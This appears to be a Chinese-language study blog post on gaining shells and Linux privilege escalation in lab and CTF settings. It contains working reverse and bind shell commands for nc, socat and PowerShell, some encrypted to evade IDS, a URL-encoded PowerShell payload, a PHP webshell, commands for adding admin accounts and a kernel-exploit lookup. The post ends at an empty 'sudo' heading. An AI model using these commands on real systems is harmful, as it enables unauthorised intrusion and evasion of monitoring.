---
layout: post
title:  "提权"
tags: [security]
---

* 目录
{:toc}

## Shell

Shell 是用户与操作系统命令行界面（CLI）交互的桥梁。在渗透远程系统时，我们有时可以迫使服务器上运行的应用程序（例如网页服务器）执行任意代码。一旦实现这一点，我们就可以利用这一初始访问权限，在目标设备上获取一个可操控的 Shell，通常有两类方法来建立：

1. reverse shell：反弹shell
2. bind shell：正向shell

### 建立shell的工具

我们可以利用工具来建立shell。

#### netcat

Netcat 是建立 Shell 连接最基础、最通用的工具，虽然默认很简陋且不稳定，但它是所有黑客必须掌握的“入门级”重型武器。

1. 定位：网络界的“瑞士军刀”

多功能性：Netcat 是一个极其强大的底层网络工具，几乎可以处理任何 TCP/UDP 相关的交互。

信息搜集：在扫描阶段，它常用于 Banner Grabbing（指纹识别），通过连接端口获取目标服务返回的欢迎信息（Banner），从而判断软件版本。

2. 核心用途：Shell 的中转站

在获取远程访问权限时，它是连接的“两端”：

接收端：作为监听器，用来接收目标机器传回的 反弹 Shell (Reverse Shell)。

发起端：作为客户端，去连接目标机器上已经开启的 正向 Shell (Bind Shell) 端口。

3. 致命弱点：不稳定性

易丢失：默认状态下的 Netcat Shell 非常脆弱。比如你不小心按了 Ctrl+C、输入了错误的命令，或者网络稍微波动，整个会话就会立即崩溃。

功能受限：它不支持命令补全（Tab 键）、不能使用向上箭头查看历史记录，甚至不支持一些交互式编辑器（如 vim）。

解决预告：虽然默认很“垃圾”，但可以通过特定的技术进行升级（Stabilization），使其变得像真正的终端一样好用。

#### socat

Netcat 像是瑞士军刀：小巧、到处都能找到，虽然功能有限但关键时刻总能顶上。

Socat 像是重型多功能电动工具箱：干活更稳、效率更高，但你得专门去买，而且还得看说明书才会用。

1. 性能：功能更强、更稳定

加强版：Socat 涵盖了 Netcat 的所有功能，并且扩展了更多高级用途。

更稳定：在获取 Shell 时，Socat 提供的连接通常比 Netcat 更加稳定（比如不容易因为误触 Ctrl+C 而断开）。

2. 缺点：门槛更高

尽管 Socat 很强大，但它有两个明显的劣势：

语法复杂：Socat 的命令参数非常多，学习曲线比 Netcat 陡峭。

普及率低：绝大多数 Linux 系统都自带 Netcat，但 Socat 通常需要手动安装。

3. 跨平台支持

Windows 可用：虽然这两个工具源自 Linux，但它们都有对应的 .exe 版本，可以在 Windows 系统上运行。

#### metasploit -- multi/handler

适用于复杂的渗透任务，特别是需要使用 Meterpreter 或自动化后渗透模块时。

1. 它的本质：超级接收器

功能：和 Netcat 或 Socat 一样，它的主要任务是“监听”并接收从目标机器弹回来的连接。

地位：它是 Metasploit 框架处理所有反弹连接的通用接口。

2. 稳定性与功能：更专业、更强大

稳定性：由于背靠 Metasploit 强大的后渗透支持，它获取的 Shell 通常非常稳定，且提供了大量现成的工具来进一步增强和加固这个 Shell。

多样性：它提供了丰富的配置选项，可以根据不同的攻击场景（如绕过防火墙）调整监听参数。

3. Meterpreter 的唯一入口

排他性：如果你使用的攻击载荷是 Meterpreter（那种功能极强、支持内存操作的 Shell），那么 multi/handler 是唯一能与之通信并进行交互的接收端。Netcat 是无法处理 Meterpreter 流量的。

4. 分阶段载荷 (Staged Payloads) 的首选

自动化：在处理“分阶段载荷”（先发一段小程序，再由小程序下载大程序的攻击方式）时，multi/handler 能自动完成后续阶段的传输和对接，这是手动工具（如 Netcat）很难做到的。

#### msfvenom

1. 它的本质：载荷生成工厂

功能：msfvenom 是一个独立运行的命令行工具，专门用于即时生成（Generate on the fly）各种攻击载荷（Payloads）。

地位：虽然它是 Metasploit 框架的一部分，但你可以直接在终端调用它，不需要先进入 msfconsole。

2. 核心用途：定制“子弹”

生成 Shell：它的主要用途是生成反弹 Shell 或 正向 Shell 的代码。

多样性：除了 Shell，它还能生成很多其他类型的攻击载荷（比如专门用于提权或执行特定命令的代码）。

多平台支持：它可以生成针对 Windows (.exe, .msi)、Linux (.elf)、Web (php, asp, jsp) 甚至 Python、Bash 脚本的载荷。

3. 极高的灵活性

参数定制：你可以通过命令参数精确控制载荷的行为，比如设置它弹回哪一个 IP（LHOST）和端口（LPORT），以及是否需要进行混淆以尝试绕过杀毒软件。

#### 其他

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/danielmiessler/SecLists

kali：/usr/share/webshells

### shell类型

1. 反弹 Shell (Reverse Shell) —— “主动求职”模式

原理：目标机器主动连接你的电脑。你在本地开启一个“监听器（Listener）”等待它连接。

优点：非常擅长绕过防火墙。大多数防火墙只严格限制“进”的流量，但对“出”的流量（目标机器主动发起的连接）管束较松。

缺点：如果目标在互联网上，你需要配置自己的网络（如路由器端口转发）来接收这个连接。但在 TryHackMe 这种虚拟专用网环境里，这不算问题。

地位：通常是首选，因为它更易于执行和调试。

2. 正向 Shell (Bind Shell) —— “开门迎客”模式

原理：目标机器在本地开启一个监听端口并绑定一个 Shell。你作为攻击者，主动去连接它的这个端口。

优点：你不需要配置自己的网络。

缺点：极其容易被防火墙拦截。目标服务器的防火墙通常会阻止任何未经过授权的端口尝试从外部进入。

#### reverse shell

在攻击机执行：

```
sudo nc -lvnp <Attacker-PORT>
```

- `-l`：listen监听模式
- `-v`：verbose详细输出
- `-n`：numeric不反查主机名，直接显示ip地址
- `-p`：port

这里用一个知名端口，比如443，更容易绕过目标主机的出站防火墙规则，但是1000以下的端口需要sudo权限。

在靶机执行：

```
nc <Attacker-IP> <Attacker-PORT> -e /bin/bash
```

#### bind shell

在靶机执行：

```
nc -lvnp <port> -e "cmd.exe"
```

在攻击机执行：

```
nc MACHINE_IP <port>
```

#### interactive shell

平时用的 Bash, PowerShell, Zsh 都是交互式的，支持实时问答。当你运行一个需要用户输入信息的程序（如 ssh 询问密码、sudo 询问密码或确认 yes/no）时，它可以正常显示提示文字并等待你输入。

#### non-interactive shell

不支持交互式程序。它只能执行那些“跑完就出结果”的命令（如 whoami, ls, cat）。如果你在非交互式 Shell 里运行 ssh 或 mysql，屏幕可能一片漆黑，或者程序直接卡死。因为它没法把“请输入密码”这句话传给你，你也无法把密码传给它。

绝大多数通过 nc 拿到的初始反弹 Shell 都是非交互式的。

### 稳定的nc shell

通过 nc 获得的 shell 默认稳定性极差。按下 Ctrl + C 就会直接终止整个会话。它属于非交互式 shell，还经常出现奇怪的格式错乱问题。究其原因，nc 所谓的 “shell” 本质只是在终端内运行的进程，并非独立完整的正规终端。好在，在 Linux 系统中有很多种方法可以对 nc shell 进行稳定化处理，本文将介绍其中三种。Windows 反弹 shell 的稳定化操作通常难度要大得多，不过接下来要讲解的第二种方法，对 Windows 反弹 shell 尤为适用。

#### python

第一种方法仅适用于 Linux 设备，因为这类设备几乎默认预装了 Python。该方法分为三个步骤：

1. 首先执行命令 `python -c 'import pty;pty.spawn ("/bin/bash")'`，该命令借助 Python 生成功能更完善的 Bash 终端；需要注意的是，部分目标设备可能需要指定 Python 版本。若遇到这种情况，可根据实际需求将 python 替换为 python2 或 python3。此时我们的终端界面会变得更加规整，但依旧无法使用制表符自动补全和方向键，按下 Ctrl + C 组合键仍会直接终止终端进程。
2. 第二步执行 `export TERM=xterm` 命令 —— 这会让我们可以使用 clear 等终端命令。
3. 最后（也是最重要的一步），我们按下 Ctrl + Z 将该 Shell 置于后台。回到本机终端后，执行命令 `stty raw -echo; fg`。该命令会完成两项操作：首先，关闭本机终端的回显功能（由此我们便可使用 Tab 键自动补全、方向键，以及 Ctrl + C 终止进程）；随后将后台的 Shell 切换至前台，至此整个操作流程完成。

请注意，如果终端会话进程终止，你在自身终端中输入的任何内容都将不可见（原因是已禁用终端回显）。若要解决此问题，盲敲 reset 并按下回车键即可。

#### rlwrap

rlwrap是一个包装器（Wrapper），利用 GNU Readline 库来增强原本简陋的命令行工具（如 nc）。

核心功能：只要在命令前加上它，你就能立刻获得：

1. 命令历史记录（向上箭头查看之前的命令）。
2. Tab 自动补全。
3. 方向键移动光标。

使用方式只需要在你的攻击机上，将普通的监听命令：`nc -lvnp <port>`替换为：`rlwrap nc -lvnp <port>`。

Windows 的反弹 Shell 极难稳定，rlwrap 是目前最简单的增强方案。但这个方案按 Ctrl+C 还是会断开连接。

如果目标系统是Linux，配合`ctrl+z` + `stty raw -echo; fg`即可防止Ctrl+C自杀。

#### socat

先用最简单的工具（Netcat）打进去，然后在对方机器上“下载安装”一个更强大的武器（Socat）。由于 Socat 支持完整的 TTY 模拟，一旦跑起来，你的 Shell 就会像 SSH 一样稳固。这种“质的提升”主要针对 Linux。在 Windows 上，Socat 并不比 Netcat 稳多少。

1. 在攻击机上准备好socat静态编译版（无任何依赖的独立编译程序版本），开启web服务`python3 -m http.server 80`，让靶机可以下载到socat可执行文件。
2. 在靶机下载socat：Linux`wget <IP>/socat -O /tmp/socat`，Windows`Invoke-WebRequest -uri <IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`。
3. 赋予执行权限并运行。

#### 调整窗口尺寸

当你完成了之前的 stty raw -echo 升级后，虽然有了交互能力，但你会发现如果运行 vim、nano 或者 top 这种全屏程序，界面往往是乱的。这是因为远程机器不知道你本地窗口的行数（rows）和列数（columns）。

1. 获取你本地的尺寸，在你自己的电脑（攻击机）上重新开一个终端窗口，运行：`stty -a`，你会看到：rows 45; columns 118;。这代表你当前的终端窗口高度是 45 行，宽度是 118 个字符。

2. 告诉远程机器这个尺寸，回到你那个已经拿到的反弹 Shell 中，根据刚才得到的数字输入：

```
stty rows 45
stty cols 118
```

### socat

Socat 的核心逻辑是：将两个不同的数据流（点）连接在一起。这两个点可以是：

- 一个网络端口和键盘（标准输入）。
- 一个网络端口和一个文件。
- 两个网络端口。
- 一个网络端口和一个可执行程序（如 /bin/bash）。

#### reverse shell

如前所述，socat 的语法比 netcat 复杂得多。以下是 socat 中基础反向 shell 监听端的语法，末尾的 - 符号，代表将接收到的流量与本地标准输入输出相连：

```
socat TCP-L:<port> -
```

在 Windows 系统中，我们将使用以下命令进行反向连接：

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

“pipes” 选项用于强制 PowerShell（或 cmd.exe）使用 Unix 风格的标准输入和输出。

以下是适用于 Linux 目标机的等效命令：

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

#### bind shells

靶机上执行：

```
# linux
socat TCP-L:<PORT> EXEC:"bash -li"
# windows
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

攻击机上执行：

```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

#### 稳定的socat shell

现在我们来了解 Socat 一项功能强大的用法：完全稳定的 Linux 终端反向 Shell。该方式仅在目标设备为 Linux 系统时可用，但稳定性要高出很多。

攻击机开启高级监听：

```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

它将你的本地终端（tty）直接作为文件传给连接，并设置 echo=0（关闭回显）。这相当于手动一键完成了 stty raw -echo。

靶机反弹并绑定 PTY：

```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- pty: 在目标机上分配一个伪终端。
- stderr: 确保错误信息也能通过 Shell 传回（很多反弹 Shell 看不到报错，就是因为没传 stderr）。
- sigint: 转发 Ctrl+C 信号。
- setsid: 在新会话中创建进程。
- sane: 自动调整并保持终端状态“理智”。

如果 Socat 连接不正常，可以加上 `-d -d` 参数（增加冗余度/Verbosity），它会输出详细的调试信息，告诉你到底是在哪一环断开了，这对后端排查网络问题非常有帮助。

#### 加密shell

普通的 nc 或 socat 流量是明文（Cleartext）传输的。这意味着：

1. 会被监控：管理员通过网络嗅探（如 Wireshark）可以直接看到你执行的每一条命令和返回的结果。
2. 会被拦截：入侵检测系统（IDS）如果发现流量中包含 whoami、cat /etc/shadow 等敏感字符，会自动切断连接。

加密的优势：加密流量看起来像普通的随机字符，能有效绕过防火墙和 IDS。

证书生成：

在使用加密 Shell 之前，你需要为你的“服务器”（监听端）准备一份证书。

生成证书私钥，这会生成一个 2048 位的 RSA 私钥和一份有效期近一年的自签名证书：

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

合并为pem文件，Socat 要求将密钥和证书合并在一个文件里。

```
cat shell.key shell.crt > shell.pem
```

开启监听，verify=0 表示连接时无需验证我们的证书是否由受信任的权威机构正规签发：

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

反向连接：

```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

对于bind-shell：

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

再次注意，即便是针对 Windows 目标主机，证书也必须与监听器配合使用，因此若要建立绑定型 Shell，必须将 PEM 文件复制到目标主机。

"稳定的socat shell"节里的命令，也可以替换为加密版本。

```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

### 常见shell载荷

之前提到的nc的-e选项，在大部分版本的nc中被认为非常不安全，因此是被禁用的。Windows 下通常可以直接使用二进制文件（支持 -e）；Linux 下则常需借助 mkfifo 绕过限制。

监听，创建一个命名管道 /tmp/f，通过管道将 Netcat 的输出传给 /bin/sh，再将 Shell 的执行结果传回 Netcat，从而形成一个闭环：

```
# 监听
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# 连接
nc <IP> <PORT>
```

![](/assets/images/20260512/mkfifo-1.png)


```
# 监听
nc -lvnp 4444

# 连接
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

单行powershell反弹shell：

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### msfvenom & multi/handler

https://dew2phan.github.io/2026/05/09/metasploit.html#msfvenom

### webshell

Webshell 是运行在 Web 服务器（如 PHP, ASP）上的脚本，允许攻击者通过网页远程执行系统命令。当无法直接建立正向（Bind）或反向（Reverse）Shell 时，Webshell 是最佳替代方案。它常作为建立更完整 Shell 的“跳板”。通过 HTML 表单或 URL 参数传递命令，结果会直接回显在网页上。

一个简单的php webshell：

```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Kali Linux 默认在 /usr/share/webshells 目录下存放了大量现成的 Webshell。需要注意的是，大多数通用型、特定语言（如 PHP）的反弹 Shell 都是为基于 Unix 的目标设备（例如 Linux 网页服务器）编写的，默认情况下无法在 Windows 系统上运行。

当目标系统为 Windows 时，通过网页木马获取远程代码执行权限往往是最简便的方式，也可以利用 msfvenom 工具，以服务器所用语言生成反弹 Shell 或绑定 Shell。采用前一种方式时，通常使用经过 URL 编码的 PowerShell 反弹 Shell 来获取远程代码执行权限。可将其作为 cmd 参数复制到网址中：

```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

这和前面的单行powershell反弹shell一样，不过它已进行 URL 编码，可在 GET 参数中安全使用。请记住，仍需在上述代码中修改 IP 地址和端口。

### 拿到shell之后

虽然反向 Shell 和正向 Shell 能提供远程代码执行（RCE）权限，但依然不如原生 Shell 好用。

Linux靶机的理想目标是直接获取用户账户的访问权限：

- SSH 密钥：在 /home/<user>/.ssh 目录下寻找私钥。
- 凭据搜寻：在系统中查找遗留的明文密码。
- 直接添加账户：利用漏洞（如 Dirty C0W 脏牛漏洞）或通过提权修改 /etc/shadow 或 /etc/passwd 直接添加自己的账户，然后通过 SSH 登录。

Windows 的方法相对受限，但思路一致：

- 挖掘注册表/文件中的密码：VNC 服务器常在注册表中存储明文密码。FileZilla FTP Server 的配置文件（如 FileZilla Server.xml）中可能存有明文或 MD5 加密的凭据。
- 添加管理员账户（前提是已获得 SYSTEM 或高权限管理员 Shell）：
    - 创建用户：`net user <username> <password> /add`
    - 提升为管理员：`net localgroup administrators <username> /add`

在实战中要特别注意，执行 net user /add 这种操作在有安全防护（EDR/杀毒软件）的环境中极其容易被触发告警。在进行这类操作前，通常需要先确认对方是否有监控。

## Linux提权

### 信息枚举

信息枚举是你获取任意系统访问权限后必须执行的第一步。你可能是通过利用高危漏洞拿到了系统最高管理员权限，也可能只是找到了借助低权限账户执行命令的方法。与CTF靶机不同，渗透测试项目并不会在你获取特定系统权限或用户权限等级后就结束。你将会发现，信息枚举在系统攻陷后的阶段和攻陷之前同样重要。

#### hostname

hostname 命令会返回目标机器的主机名。尽管该值可以被轻易修改，也可能是一串无实际意义的字符（例如：Ubuntu-3487340239），但在部分场景下，它能够透露目标系统在企业网络中的角色信息（例如：SQL-PROD-01 代表生产环境 SQL 服务器）。

#### uname -a

会打印系统信息，为我们提供系统所使用内核的更多详细信息。这对于排查可能导致权限提升的各类潜在内核漏洞十分有用。

#### /proc/version

进程文件系统（procfs）可提供目标系统进程的相关信息。众多不同版本的 Linux 系统中都自带 proc 文件系统，是运维和渗透工作中必备的实用工具。

查看 /proc/version 文件可以获取内核版本信息以及其他附加数据，例如系统是否安装了 GCC 等编译器。

#### /etc/issue

也可通过查看 /etc/issue 文件来识别系统。该文件通常包含一些操作系统相关信息，但可以被轻易自定义或修改。顺带一提，任何包含系统信息的文件都能够被自定义或篡改。若要更清晰地了解系统情况，逐一查看所有这类文件始终是稳妥的做法。

#### ps

ps 命令是查看 Linux 系统中正在运行进程的有效方式。在终端中输入 ps，即可显示**当前终端会话**的进程。ps（进程状态）命令的输出会包含以下内容：

- PID：进程标识符（每个进程唯一）
- TTY：用户所使用的终端类型
- Time：进程占用的 CPU 时长（并非进程已运行的时间）
- CMD：正在运行的命令或可执行程序（不会显示任何命令行参数）

```
$ ps
  PID TTY          TIME CMD
 1702 pts/4    00:00:00 sh
 1848 pts/4    00:00:00 ps
```

Linux 中 ps 命令的一个历史“大坑”：它同时支持 UNIX 风格（带短横线 -）和 BSD 风格（不带短横线）。常用的`ps -ef`和`ps aux`就分别是unix风格和bsd风格，作用是等价的，都是列出所有进程（`-e或ax`），`-f`和`u`都是用于展示更多列。

ps 命令选项：

- `ps -A`或`ps -e`：两者等价，查看系统所有用户运行的所有进程
- `ps axjf`：查看进程树
    - a：显示所有前台进程
    - x：显示所有后台进程
    - j：采用任务控制格式（Jobs format）。这是最核心的部分，它会列出 PPID（父进程 ID）、PGID（进程组 ID）和 SID（会话 ID）。
    - f：采用 ASCII 艺术风格的树状结构（Forest） 显示进程间的父子派生关系。
- `ps aux`：aux 选项会展示所有用户的进程（a）、显示启动进程的所属用户（u），以及列出未关联终端的进程（x）。通过查看 ps aux 命令的输出结果，我们可以更好地了解系统状况以及潜在的安全漏洞。

#### env

env 命令将显示环境变量。

环境变量 PATH 中可能包含编译器或脚本语言（例如 Python），可用于在目标系统上执行代码，或被利用来进行权限提升。

#### sudo -l

目标系统可能已配置为允许用户以 root 权限运行部分（或全部）命令。可使用 sudo -l 命令列出当前用户能够通过 sudo 执行的所有命令。

#### ls

Linux 中常用的命令之一当属 ls 命令。

在寻找潜在的提权路径时，请务必记得始终使用带 -la 参数的 ls 命令。下方示例将演示，仅使用 ls 命令或 ls -l 命令时，很容易忽略掉 secret.txt 这类文件。

#### id

id 命令可以整体查看当前用户的权限级别以及所属用户组信息。

值得注意的是，id 命令也可用于查看其他用户的信息，比如`id root`。

#### /etc/passwd

用于发现系统用户：

```
karen@wade7363:/$ cat /etc/passwd | cut -d ":" -f 1
root
daemon
bin
sys
sync
games
man
```

请记住，该操作会返回所有用户，其中部分为系统用户或服务用户，参考价值并不大。另一种可行方法是使用 grep 命令检索 “home” 相关内容，因为真实用户的个人目录大概率都存放在 home 目录下：

```
karen@wade7363:/$ cat /etc/passwd | grep home
syslog:x:101:104::/home/syslog:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
saned:x:108:115::/home/saned:/bin/false
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
```

#### history

使用 history 命令查看历史执行过的命令，能够让我们对目标系统有一定了解，且极少数情况下还可能留存有密码、用户名这类敏感信息。

#### ifconfig

ifconfig 命令可以为我们提供该系统网络接口的相关信息。比如显示目标系统拥有三个接口（eth0、tun0 和 tun1）。我们的攻击机可以访问 eth0 接口，但无法直接接入另外两个网络。

那么目标系统可能可以作为通往其他网络的跳板。可以结合`ip route`命令确认。

#### netstat

在初步检查现有网络接口和网络路由后，有必要进一步查看当前的通信连接状态。可以搭配多个不同参数使用 netstat 命令，以此采集现有网络连接的相关信息。

- `netstat -a`：显示所有监听端口以及已建立的网络连接，如果不加-a，则仅提供活跃传输链路视图。
- `netstat -at` 或 `netstat -au` 可分别用于列出 TCP 协议或 UDP 协议的相关连接。
- `netstat -l`：列出处于 “监听” 状态的端口。这类端口已开放，可接收外部接入连接。该命令可搭配参数 t 使用，仅列出基于 TCP 协议进行监听的端口
- `netstat -s`：按协议列出网络使用统计信息。该命令也可搭配 -t 或 -u 参数，将输出结果限定为指定协议。
- `netstat -p`：列出带有服务名称和进程 ID 信息的连接，也可搭配-t -u -l参数。如果看到 “PID/Program name” 列为空，表示该进程由其他用户拥有。
- `netstat -i`：显示网络接口统计信息。

#### find

以下是 find 命令的一些实用示例。

- `find . -name flag1.txt`：在当前目录下查找名为 “flag1.txt” 的文件
- `find /home -name flag1.txt`：在 /home 目录下查找名为 “flag1.txt” 的文件
- `find / -type d -name config`：在根目录 “/” 下查找名为 config 的目录
- `find / -type f -perm 0777`：查找权限为 777 的文件（所有用户均可读取、写入和执行的文件）
- `find / -perm a=x`：查找可执行文件
- `find /home -user frank`：在 /home 目录下查找所有者为用户 “frank” 的所有文件
- `find / -mtime 10`：查找近 10 天内修改过的文件
- `find / -atime 10`：查找近 10 天内被访问过的文件
- `find / -cmin -60`：查找一小时（60 分钟）内属性发生变更的文件
- `find / -amin -60`：查找一小时（60 分钟）内被访问过的文件
- `find / -size 50M`：查找大小为 50 兆字节的文件
- `find / -size +50M`：查找大于 50 兆字节的文件
- `find / -size -50M`：查找小于 50 兆字节的文件
- `find / -size +50M -type f 2>/dev/null`：查找大于 50 兆字节的文件，不打印错误信息

寻找全局可写的目录：

- `find / -writable -type d 2>/dev/null`：基于当前执行命令的用户权限来判断
- `find / -perm -222 -type d 2>/dev/null`：这里的横杠 - 表示“至少包含”这些位。222 对应的是 w-w-w-（属主、属组、其他人都有写权限）。
- `find / -perm -o w -type d 2>/dev/null`：-o w表示 "Others" 拥有 "Write" 权限。
- `find / -perm -o x -type d 2>/dev/null`：寻找那些“其他人”可以 CD（进入） 进去的目录。在 Linux 中，目录的执行权限 x 代表“搜索权限”，即能否访问该目录下的文件。如果一个目录可执行但不可读，你虽然不能 ls 看到列表，但如果你知道文件名，你依然可以对其进行操作。

查找开发工具及支持的编程语言：

- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

以下是一个用于查找设置了 SUID 权限位文件的简短示例。SUID 权限位可让文件以其所属用户账号的权限级别运行，而非以执行该文件的用户账号权限运行。这会形成一条可利用的权限提升路径。

`find /-perm -u=s -type f 2>/dev/null`：查找设置了 SUID 权限位的文件，该权限可让我们以高于当前用户的权限级别运行文件。

#### 自动枚举工具

有多款工具能够帮你在信息搜集过程中节省时间。使用这类工具仅可作为省时手段，需知晓它们可能会遗漏部分权限提升路径。以下是常用的 Linux 信息搜集工具列表，并附带各自的 GitHub 仓库链接。

目标系统的环境会决定你能够使用哪些工具。例如，若目标系统未安装 Python，你就无法运行基于 Python 编写的工具。因此，熟练掌握多款工具，远比只依赖某一款固定工具要好。

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS(opens in new tab)
- LinEnum: https://github.com/rebootuser/LinEnum(opens in new tab)(opens in new tab)
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester(opens in new tab)
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration(opens in new tab)
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

### 内核漏洞利用

Linux的内核权限很高，如果能利用内核漏洞，就能取得root权限。

- 确定内核版本
- 搜索并查找适配目标系统内核版本的漏洞利用代码
- 运行漏洞利用程序

虽然步骤看上去简单，但是一旦内核漏洞利用失败，可能导致系统崩溃，因此在真正实施前务必确保能承受此后果。

研究来源：

- 根据你的发现，可通过谷歌搜索现有的漏洞利用代码。
- 诸如 https://www.cvedetails.com/这类网站也能提供帮助。
- 另一种方法是使用LES这类自动枚举工具，但需注意，此类工具可能产生误报（报告不影响目标系统的内核漏洞）或漏报（内核存在漏洞却未检测出）。

注意事项：

- 在谷歌、漏洞数据库 Exploit-db 或漏洞搜索工具 searchsploit 上搜索漏洞利用程序时，不要把内核版本限定得过于具体。
- 在运行漏洞利用代码前，务必理解其工作原理。部分漏洞利用代码会对操作系统做出修改，导致系统后续使用存在安全隐患，或是对系统造成不可逆改动，进而引发后续各类问题。当然，在实验环境或 CTF 夺旗赛场景中这类问题影响不大，但在真实的渗透测试项目中，这是绝对禁止的行为。
- 部分漏洞利用程序运行后需要进行后续交互操作，请仔细阅读漏洞利用代码附带的所有注释与使用说明。
- 你可以分别借助 Python 的 SimpleHTTPServer 模块和 wget 工具，将漏洞利用代码从本机传输至目标系统。

```
karen@wade7363:/$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
karen@wade7363:/$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
karen@wade7363:/$ cat /etc/issue
Ubuntu 14.04 LTS \n \l


root@ip-10-49-112-244:~# searchsploit ubuntu 14.04 3.13
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalati | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalati | linux/local/37293.txt
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                    | linux/local/31346.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                               | linux/dos/43234.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                      | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                             | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation  | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SM | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Es | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation             | linux/local/41760.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@ip-10-49-112-244:~# searchsploit -m linux/local/37292.c
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /opt/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines
Copied to: /root/37292.c
```

### sudo

